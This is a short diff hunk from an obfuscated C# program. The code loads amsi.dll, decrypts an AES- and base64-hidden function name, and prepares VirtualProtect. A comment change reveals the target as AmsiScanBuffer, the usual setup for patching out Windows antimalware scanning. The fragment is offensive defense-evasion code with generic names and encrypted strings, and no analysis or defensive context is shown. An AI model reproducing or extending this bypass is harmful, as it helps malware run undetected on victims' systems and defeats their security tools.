@@ -73,7 +73,7 @@ namespace namespace_1
 			class_1.VirtualProtect_func virtProtect_func = (class_1.VirtualProtect_func) Marshal.GetDelegateForFunctionPointer(VirtualProtect_funcPtr, typeof(class_1.VirtualProtect_func));
 			
             IntPtr amsi_hmodule = class_1.LoadLibrary("amsi.dll");
-			IntPtr IsDebuggerPresent_funcPtr = class_1.GetProcAddress(amsi_hmodule,  // IsDebuggerPresent
+			IntPtr IsDebuggerPresent_funcPtr = class_1.GetProcAddress(amsi_hmodule,  // AmsiScanBuffer
                 Encoding.UTF8.GetString(class_1.aes_decryptor_func(
                     Convert.FromBase64String("WG/Dged0cIrjNUQv5M9ONw=="), 
                     Convert.FromBase64String("+uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc="), 
